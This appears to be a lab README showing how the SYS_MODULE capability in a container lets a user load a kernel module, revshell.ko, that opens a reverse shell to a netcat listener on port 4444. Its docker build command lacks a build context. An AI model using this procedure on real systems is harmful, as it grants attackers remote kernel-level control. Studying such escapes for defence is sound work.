# SYS\_MODULE

To build and run the container, use:

```console
docker build -t modcap
bash run-container.sh
```

From inside the container, navigate to `/module` and run `make`.
Open `tmux`, from one terminal run `nc -lv 4444`, and from another one run `insmod revshell.ko`.
You should get a reverse shell in the first terminal.
